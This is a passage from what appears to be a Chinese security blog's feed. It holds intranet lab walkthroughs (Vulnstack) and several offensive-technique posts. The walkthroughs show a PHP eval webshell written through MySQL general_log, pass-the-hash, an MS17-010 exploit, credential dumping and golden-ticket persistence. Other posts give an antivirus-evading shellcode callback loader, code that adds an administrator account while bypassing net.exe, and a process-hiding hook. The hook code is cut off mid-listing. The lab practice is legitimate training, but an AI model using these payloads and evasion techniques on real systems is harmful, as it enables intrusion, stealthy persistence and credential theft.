src="/img/hongri2/21.png"><br>可以看到其中有mssql明文密码和Administrator明文密码</p><p>准备3389连接,不过无论是<code>Administrator</code>还是<code>de1ay</code>都无法登录,准备添加一个账户,但添加后说没有权限,应该是普通用户组没有权限<br><img src="/img/hongri2/24.png"></p><p>使用命令添加到管理员组,连接成功<br><img src="/img/hongri2/25.png"></p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>扫描下同网段其他主机<br><img src="/img/hongri2/21.png"></p><p>扫描<code>192.168.111.0/24</code>以及他们的端口,发现一台名为<code>PC</code>主机,并且3389开启<br><img src="/img/hongri2/22.png"></p><p>再扫描10段<br><img src="/img/hongri2/23.png"><br>发现一台名为DC主机,看着名字就知道是域控,加上刚刚探测dns和主域名称,并且他的ip是<code>10.10.10.10</code>,基本可以判断这台就是域控</p><h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>那么在域控明确的情况下优先处理<code>DC</code>,首先想到的就是pth,因为域内很多密码都是批量设置的,这必须要试一下<br>使用当前抓取的Administrator账户和密码来传递</p><p><img src="/img/hongri2/26.png"><br>这里应该是成功了,但是迟迟未上线</p><p><img src="/img/hongri2/27.png"><br>太概率是由于对方不出网,无法形成反向shell,不出网的话一般就用smb处理,翻回刚刚的扫描记录,对方445端口是开启的,可以使用smb拿不出网主机<br><img src="/img/hongri2/28.png"></p><p>新增一个SMB beacon<br><img src="/img/hongri2/29.png"></p><p>再次使用psexec pass the hash<br><img src="/img/hongri2/30.png"></p><p>成功拿下DC<br><img src="/img/hongri2/31.png"></p><h3 id="MS17010"><a href="#MS17010" class="headerlink" title="MS17010"></a>MS17010</h3><p>那么这里换一种思路,如果pth失败了,怎么办,那就要使用已知漏洞,比如MS7010<br>这里使用Ladon对10段扫描漏洞,发现DC是有漏洞的<br><img src="/img/hongri2/46.png"><br>在cs上不方便操作,派生会话给msf<br>首先在msf上执行如下操作</p><ul><li>use exploit/multi/handler</li><li>set payload windows/meterpreter/reverse_http（跟cs上选用的payload一样）</li><li>set lhost 本机ip</li><li>set lport 接受的端口</li><li>exploit 执行</li></ul><p><img src="/img/hongri2/47.png"><br>回到cs上创建一个foreign监听的listeners<br><img src="/img/hongri2/48.png"></p><p>创建后右键WEB选择增加会话<br><img src="/img/hongri2/49.png"></p><p>选择msf的payload<br><img src="/img/hongri2/50.png"></p><p>msf等待shel反弹即可<br><img src="/img/hongri2/51.png"></p><p>由于目标不出网,需要先添加路由</p><ul><li>run get_local_subnets</li><li>run autoroute -s 10.10.10.0/24</li><li>run autoroute -p</li></ul><p><img src="/img/hongri2/52.png"></p><p>一开始使用<code>windows/smb/ms17_010_eternalblue</code>这个模块<br><img src="/img/hongri2/53.png"></p><p>已经攻击成功了但是没有session返回,去看了一眼,好家伙,直接蓝屏<br><img src="/img/hongri2/54.png"><br>所以这个模块一定要慎用。索性换个模块<br>成功拿下<br><img src="/img/hongri2/55.png"></p><h3 id="抓取DC密码"><a href="#抓取DC密码" class="headerlink" title="抓取DC密码"></a>抓取DC密码</h3><p>hashdump<br><img src="/img/hongri2/32.png"><br>有了域内<code>KRBTGT</code>账户的hash就可以伪造黄金票据</p><p>logonpasswords<br><img src="/img/hongri2/33.png"></p><p>查询域管账户<br><img src="/img/hongri2/34.png"><br>DC就算是拿下了</p><p>用相同的方式拿下PC<br><img src="/img/hongri2/35.png"><br>PC是出网的可以直接用http beacon</p><p><img src="/img/hongri2/36.png"></p><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>做权限维持方式很多,粘滞键、启动项、影子用户等等。这次是拿到域控,这种情况下,黄金票据是一个很好的维权手段<br>黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。</p><p>黄金票据的条件要求：</p><ol><li>域名称</li><li>域的SID值</li><li>域的KRBTGT账户NTLM密码哈希</li><li>伪造用户名</li></ol><p>黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。</p><p>这里我们已经拿到了<code>KRBTGT</code>账户的hash值<br><img src="/img/hongri2/37.png"></p><p>并且也拿到了域的SID值,去掉最后的-1001<br><img src="/img/hongri2/38.png"><br>就可以伪造一张黄金票据</p><p>选择最边缘的web<br><img src="/img/hongri2/39.png"></p><p>伪造黄金票据成功<br><img src="/img/hongri2/40.png"></p><p>这里为了测试用了PC,一开始是无法访问域控目录的<br><img src="/img/hongri2/41.png"></p><p>生成黄金票据后<br><img src="/img/hongri2/42.png"></p><p>即使域控这台主机权限掉了,我们也能使用其他边缘主机用这个黄金票据模拟获得最高权限,而且由于跳过AS验证,无需担心域管密码被修改<br><img src="/img/hongri2/43.png"></p><p>添加域管账户<br><img src="/img/hongri2/44.png"><br>在域控上查看域管账户,添加成功<br><img src="/img/hongri2/45.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>内网靶场实战一</title>
    <link href="/2021/07/11/hongri1/"/>
    <url>/2021/07/11/hongri1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来不想写这些的,但是最近项目写起来确实稍有些枯燥,又不敢拿真实环境去打,奈何两个月过后要去比赛,所以这段时间会加强web打点和内网这块,这些方面我是小白,欢迎斧正。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶场地址:<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p><img src="/img/hongri1/1.png"><br>网卡配置:</p><p><img src="/img/hongri1/2.png"></p><p>网络拓扑图:<br>kali和web服务器模拟外网环境,并且web服务器有双网卡,一张通向内网<br><img src="/img/hongri1/3.png"></p><p>win7作为与外界相连的web服务器</p><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><p>直接访问目标<br><img src="/img/hongri1/4.png"></p><p>试试弱密码root root,连接成功<br><img src="/img/hongri1/5.png"></p><p>再回来探测下端口信息</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">namp</span> -sV <span class="hljs-number">192.168.235.129</span><br></code></pre></td></tr></table></figure><p><img src="/img/hongri1/6.png"></p><p>可以看到只有3306 mysql和80端口开放<br>再扫下目录<br>可以看到phpmyadmin和一个rar包,应该是源码泄露<br><img src="/img/hongri1/7.png"></p><p>phpmyadmin还是弱密码root root<br><img src="/img/hongri1/8.png"></p><p>压缩包解压后是yxcms<br><img src="/img/hongri1/9.png"></p><p>在网上搜锁该cms的漏洞,发现后台<br><img src="/img/hongri1/10.png"></p><p>还是弱口令 admin 123456登录后台<br>后台有个位置任意文件写入<br><img src="/img/hongri1/11.png"></p><p>但是没看到路径,尝试bp报错找到路径<br><img src="/img/hongri1/12.png"></p><p>访问测试一下,后来发现跟改的url有关,成功访问<br><img src="/img/hongri1/13.png"></p><p>这样一个shell就拿到了<br><img src="/img/hongri1/14.png"></p><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><p>回到刚刚phpmyadmin界面<br>利用全局变量general_log去getshell</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">SHOW <span class="hljs-keyword">VARIABLES</span> LIKE <span class="hljs-comment">&#x27;%general%&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/hongri1/15.png"><br>看到是off,是关闭的,于是尝试更改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> global <span class="hljs-attribute">general_log</span>=on<br></code></pre></td></tr></table></figure><p>再次查询就已经开启<br><img src="/img/hongri1/16.png"><br>再把网站日志文件名和后缀名改一下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> global <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">&#x27;C:/phpstudy/www/yxcms/log.php&#x27;</span><br></code></pre></td></tr></table></figure><p>使用<code>SELECT &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;</code>写入shell<br><img src="/img/hongri1/17.png"><br>连接成功<br><img src="/img/hongri1/18.png"></p><h2 id="内网漫游"><a href="#内网漫游" class="headerlink" title="内网漫游"></a>内网漫游</h2><p>因为平时cs用的比较多,所以这次就用msf试试<br>发现双网卡<br><img src="/img/hongri1/19.png"><br><code>192.168.26.0/24</code>通向内网<br>net view无回显,tasklist发现无杀软<br><img src="/img/hongri1/20.png"></p><p>权限还可以,3389未开放<br><img src="/img/hongri1/21.png"><br>因为权限够,也不需要提权了,直接修改注册表</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f<br></code></pre></td></tr></table></figure><p>再次查看发现已经开启<br><img src="/img/hongri1/22.png"></p><h3 id="反弹shell到msf"><a href="#反弹shell到msf" class="headerlink" title="反弹shell到msf"></a>反弹shell到msf</h3><p>生成一个powershell的马<br><img src="/img/hongri1/23.png"><br>监听<br><img src="/img/hongri1/24.png"><br>但是执行好像没成功,msf也没收到会话<br><img src="/img/hongri1/25.png"><br>应该是禁用了执行powershell,懒得改了,算了换个exe吧<br><img src="/img/hongri1/26.png"><br>上传执行后成功反弹shell<br><img src="/img/hongri1/27.png"><br>添加路由<br><img src="/img/hongri1/28.png"><br>探测内网存活主机,发现两台<br><img src="/img/hongri1/29.png"><br>直接扫一波永恒之蓝<br><img src="/img/hongri1/30.png"><br>发现129这台为2008且有永恒之蓝<br>使用command模块打一波,命令执行成功<br><img src="/img/hongri1/31.png"><br>想要反弹shell却失败了<br><img src="/img/hongri1/32.png"><br>复制个shell给cs,没上线,很无语<br><img src="/img/hongri1/33.png"><br>还是直接上吧,舒服多了<br><img src="/img/hongri1/34.png"><br>抓一波密码<br><img src="/img/hongri1/35.png"><br>抓到明文,这里其实就可以3389连上去看看<br><img src="/img/hongri1/36.png"><br>不过还是先扫,探测一下存活主机<br><img src="/img/hongri1/37.png"><br>这里第一时间是想横向一波,psexec,但是执行后服务已经建立,但是无shell反弹,突然想起这是台不出网主机,选择smb beacon即可<br><img src="/img/hongri1/38.png"></p><p><img src="/img/hongri1/39.png"></p><p>03拿下<br><img src="/img/hongri1/40.png"></p><p>同样的方法拿下域控2008<br><img src="/img/hongri1/41.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>滕蛇</title>
    <link href="/2021/07/03/TengSnake/"/>
    <url>/2021/07/03/TengSnake/</url>
    
    <content type="html"><![CDATA[<p>前几天师傅叫我写个连webshell的工具,本来觉得对我来说是个挑战,但后来细想这是有必要的,陆陆续续写了一些小的东工具西,也要带着一个大项目走。<br>将继续采用c++,MFC编写。</p><h2 id="滕蛇"><a href="#滕蛇" class="headerlink" title="滕蛇"></a>滕蛇</h2><p>这是我为它取得名字,”滕蛇”为上古十大神兽之一,希望它愈加强大的愿景。本文写在这里,纪念滕蛇的出生。</p><p><img src="/img/TengSnake/1.png"></p><p><img src="/img/TengSnake/2.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shellcode加载Tips之回调函数</title>
    <link href="/2021/06/27/CallBackByPass/"/>
    <url>/2021/06/27/CallBackByPass/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>VirtualAlloc</code>,<code>HeapAlloc</code>,<code>malloc</code>,<code>VirtualAllocEx</code>,这些API,只要你做过shellcode免杀就一定不会陌生,包括<code>CreatThread</code>或者函数指针这些执行,早就被终端产品标记烂了。利用回调函数,可以避免使用上述所有API。</p><h2 id="EnumFontFamilies"><a href="#EnumFontFamilies" class="headerlink" title="EnumFontFamilies"></a>EnumFontFamilies</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">EnumFontFamiliesW</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  HDC           hdc,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR       lpLogfont,</span></span><br><span class="hljs-params"><span class="hljs-function">  FONTENUMPROCW lpProc,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPARAM        lParam</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>MSDN:<a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-enumfontfamiliesw">https://docs.microsoft.com/en-us/windows/win32/api/wingdi/nf-wingdi-enumfontfamiliesw</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> shellcode[] = <span class="hljs-string">&quot;&quot;</span>;<br>DWORD oldProtect = <span class="hljs-number">0</span>;<br>BOOL ret = <span class="hljs-built_in">VirtualProtect</span>((LPVOID)shellcode, <span class="hljs-keyword">sizeof</span> shellcode, PAGE_EXECUTE_READWRITE, &amp;oldProtect);<br><br><span class="hljs-built_in">EnumFontFamilies</span>(<span class="hljs-built_in">GetDC</span>(<span class="hljs-number">0</span>), (LPCWSTR)<span class="hljs-number">0</span>, (FONTENUMPROC)(<span class="hljs-keyword">char</span>*)shellcode, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/CallBackByPass/1.png"></p><h2 id="其他回调API"><a href="#其他回调API" class="headerlink" title="其他回调API"></a>其他回调API</h2><p>枚举资源:<code>EnumResourceTypes</code></p><p><img src="/img/CallBackByPass/2.png"></p><p>调用窗口:<code>CallWindowProc</code></p><p><img src="/img/CallBackByPass/3.png"></p><p>还有很多:<a href="https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection">https://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Tips很短。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>使用windowsAPI规避net禁用</title>
    <link href="/2021/06/24/IcanUseNet/"/>
    <url>/2021/06/24/IcanUseNet/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>做权限维持的时候,或者希望RDP到远程桌面,有时密码并没有那么容易抓到,那么通常寄希望于添加一个账户,那么往往我们会这样做:</p><p><img src="/img/IcanUseNet/1.png"></p><p>这没有任何问题,但如果有第三方杀软存在呢？这个命令未必能执行。</p><h2 id="NET"><a href="#NET" class="headerlink" title="NET"></a>NET</h2><p>NET命令是功能强大的以命令行方式执行的工具。它包含了管理网络环境、服务、用户、登陆等Windows 98/NT/2000 中大部分重要的管理功能。使用它可以轻松的管理本地或者远程计算机的网络环境，以及各种服务程序的运行和配置。或者进行用户管理和登陆管理等。</p><p>实际上net是调用了这个PE文件</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">C:<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\S</span>ystem32<span class="hljs-symbol">\n</span>et1.exe<br></code></pre></td></tr></table></figure><p><img src="/img/IcanUseNet/2.png"></p><p>那么终端产品同样也重点监控着这个文件的调用,甚至有经验的管理员也许会直接删除这个文件,这样我们希望添加用户的美好愿望就会泡汤。但经前人研究,利用<code>netapi32.dll</code>中的API,可以绕过这一限制(目前为止依然有效)。</p><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><h3 id="NetUserAdd"><a href="#NetUserAdd" class="headerlink" title="NetUserAdd"></a>NetUserAdd</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-function">NET_API_STATUS NET_API_FUNCTION <span class="hljs-title">NetUserAdd</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR servername,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD   level,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPBYTE  buf,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPDWORD parm_err</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>NetUserAdd函数添加一个用户帐户，并指定密码和权限级别。<br>微软文档:<a href="https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd">https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netuseradd</a></p><h3 id="NetLocalGroupAddMembers"><a href="#NetLocalGroupAddMembers" class="headerlink" title="NetLocalGroupAddMembers"></a>NetLocalGroupAddMembers</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">NET_API_STATUS NET_API_FUNCTION <span class="hljs-title">NetLocalGroupAddMembers</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR servername,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPCWSTR groupname,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD   level,</span></span><br><span class="hljs-params"><span class="hljs-function">  LPBYTE  buf,</span></span><br><span class="hljs-params"><span class="hljs-function">  DWORD   totalentries</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>NetLocalGroupAddMembers能够把用户加到组里,比如Administrators组<br>微软文档:<a href="https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers">https://docs.microsoft.com/en-us/windows/win32/api/lmaccess/nf-lmaccess-netlocalgroupaddmembers</a></p><p>这两个函数的参数就不说了,参考微软文档</p><h2 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;lm.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> hdrstop</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;netapi32.lib&quot;</span>)</span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wmain</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc,<span class="hljs-keyword">wchar_t</span>* argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>    USER_INFO_1 ui;<br>    DWORD dwlevel = <span class="hljs-number">1</span>;<br>    DWORD dwError = <span class="hljs-number">0</span>;<br>    NET_API_STATUS nStatus;<br><br>    <span class="hljs-keyword">if</span> (argc != <span class="hljs-number">3</span>)<br>    &#123;<br>        <span class="hljs-built_in">fwprintf</span>(stderr, <span class="hljs-string">L&quot;[!] Usage: %s UserName PassWord\n&quot;</span>, argv[<span class="hljs-number">0</span>]);<br>    &#125;<br>    ui.usri1_name = argv[<span class="hljs-number">1</span>];<br>    ui.usri1_password = argv[<span class="hljs-number">2</span>];<br>    ui.usri1_priv = USER_PRIV_USER;<br>    ui.usri1_home_dir = <span class="hljs-literal">NULL</span>;<br>    ui.usri1_comment = <span class="hljs-literal">NULL</span>;<br>    ui.usri1_flags = UF_SCRIPT;<br>    ui.usri1_script_path = <span class="hljs-literal">NULL</span>;<br><br>    nStatus = <span class="hljs-built_in">NetUserAdd</span>(<span class="hljs-literal">NULL</span>, dwlevel, (LPBYTE)&amp;ui, &amp;dwError);<br><br>    <span class="hljs-keyword">if</span> (nStatus == NERR_Success)<br>    &#123;<br>        <span class="hljs-built_in">fwprintf</span>(stderr,<span class="hljs-string">L&quot;[+] User %s has been successfully added\n&quot;</span>,argv[<span class="hljs-number">1</span>]);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-built_in">fprintf</span>(stderr, <span class="hljs-string">&quot;[!] A system error had ocurred %d\n&quot;</span>, nStatus);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>和直接添加用户一样,需要管理员权限。</p><p><img src="/img/IcanUseNet/3.png"></p><p>通过<code>NetLocalGroupAddMembers</code>将用户加入到Administrators组</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++">LOCALGROUP_MEMBERS_INFO_3 account;<br>account.lgrmi3_domainandname = argv[<span class="hljs-number">1</span>];<br><br>NET_API_STATUS Status = <span class="hljs-built_in">NetLocalGroupAddMembers</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-string">L&quot;Administrators&quot;</span>, <span class="hljs-number">3</span>, (LPBYTE)&amp;account, <span class="hljs-number">1</span>);<br><br><span class="hljs-keyword">if</span> (Status == NERR_Success || Status == ERROR_MEMBER_IN_ALIAS) <br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+] Administrators added Successfully!&quot;</span>);<br>&#125;<br><span class="hljs-keyword">else</span> <br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[!] Administrators added Failed!&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/IcanUseNet/4.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>HOOK之进程隐藏</title>
    <link href="/2021/06/23/HookZwQuerySystemInformation/"/>
    <url>/2021/06/23/HookZwQuerySystemInformation/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一次跟师傅交流时师傅谈到有些EDR或AV,他们保护目标主机,甚至无进程,不经想到病毒实际上也常用这种技术。当然,做到隐藏,一个简单的dll注入或者劫持就可以,但本文主要讲解关于进程的隐藏。</p><p>PE文件隐藏可以通过</p><ul><li>进程伪装: 将进程名替换成其他正常进程的名称(修改PEB路径和命令行信息)</li><li>傀儡进程: 通过将主进程挂起,替换内存数据,卸载镜像,修改上下文,并执行真正我们想要执行的进程,这也是一些壳的原理</li><li>HOOK: 通过HOOK三环最底层API<code>ZwQuerySystemInformation</code>实现隐藏,这是本文的重点</li><li>COM劫持、DLL劫持、DLL注入……</li></ul><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>在正向开发中,要想做到进程遍历,往往需要使用<code>EnumProcess</code>或是快照<code>CreateToolhelp32Snapshot</code>这些函数<br>而这些函数的底层(ring 3),都是调用的<code>ZwQuerySystemInformation</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">NTSTATUS WINAPI <span class="hljs-title">ZwQuerySystemInformation</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">  _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">  _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">  _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">)</span></span>;<br></code></pre></td></tr></table></figure><p>如果通过hook进行对<code>ZwQuerySystemInformation</code>的重定向,那么就可以改变执行流,返回的信息中已经被我们篡改。<br>32位下和64位下需要修改的字节数是不同的,使用xdbg断点找到对应的硬编码</p><p>32位下:<br>需要修改5个字节硬编码</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-number">0xe9</span> xx xx xx xx<br></code></pre></td></tr></table></figure><p><img src="/img/HOOKZwQuerySystemInformation/1.png"></p><p><img src="/img/HOOKZwQuerySystemInformation/2.png"></p><p>64位下:<br>需要修改12个字节的硬编码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x48</span> <span class="hljs-number">0</span>xb<span class="hljs-number">8</span>, xx xx xx xx xx xx xx xx<br><span class="hljs-attribute">0xFF</span> <span class="hljs-number">0</span>xE<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p><img src="/img/HOOKZwQuerySystemInformation/3.png"></p><p><img src="/img/HOOKZwQuerySystemInformation/4.png"><br>64位下该函数的名称已经改为<code>RtlGetNativeSystemInformation</code>。<br>将<code>hookZwQuerySystemInformation</code>函数写在dll中,这样方便注入到任何进程中。</p><h2 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h2><p>hook函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hookZwQuerySystemInformation</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//获取ZwQuerySystemInformation的地址</span><br>    HMODULE hntdll = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hntdll) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Load ntdll Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span 